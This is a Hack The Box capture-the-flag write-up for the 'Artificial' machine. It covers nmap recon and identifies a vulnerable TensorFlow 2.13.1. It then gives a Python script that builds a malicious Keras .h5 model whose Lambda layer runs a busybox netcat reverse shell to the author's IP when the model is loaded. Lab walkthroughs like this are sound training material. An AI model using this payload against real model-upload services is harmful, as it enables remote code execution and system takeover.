starting with initial recon 

```
nmap -sV -sC -oN nmap.txt  -p- 10.10.11.74 --min-rate=5000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 16:21 CET
Nmap scan report for 10.10.11.74 (10.10.11.74)
Host is up (0.68s latency).
Not shown: 48960 filtered tcp ports (no-response), 16573 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.67 seconds
```

adding the domain to our `/etc/hosts `

```cmd 
sudo echo "10.10.11.74     artificial.htb" >> /etc/hosts 
```

simple looking ui 
<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162502.png">
registering a new account and logging in with it 
<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162718.png">
this will lead us to the page where it present us with this .. 
<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017162855.png">
checking the `requirement.txt` and `Dockerfile` 

Dockerfile 
```
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

requirements.txt 
```
tensorflow-cpu==2.13.1
```

this version of tensorflow library might have some vurnabilitys .  

after searching i found this 

https://github.com/advisories/GHSA-x4wf-678h-2pmq

looking for POC to recreate the exploit 

https://mastersplinter.work/research/tensorflow-rce/

the idea is to generate a `.h5` model that contains our malicious command so we can import it and get a reverse shell 

to recreate the exploit we need first to install tensorflow on our machine  (which is annoying task) 


```python3 
import tensorflow as tf

def exploit(x):
    import os
    os.system("busybox nc 10.10.15.53 4444 -e /bin/sh")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

I always use busybox since its found on every linux distro . 

generating our model 
```cmd
python3 exploit.py 
```

opening a listener on our machine 
<img src="https://raw.githubusercontent.com/Baga6312/HTB-Writeups/refs/heads/main/machines/artificial/assets/Pasted image 20251017165134.png">
and finally importing our model will give us a shell 



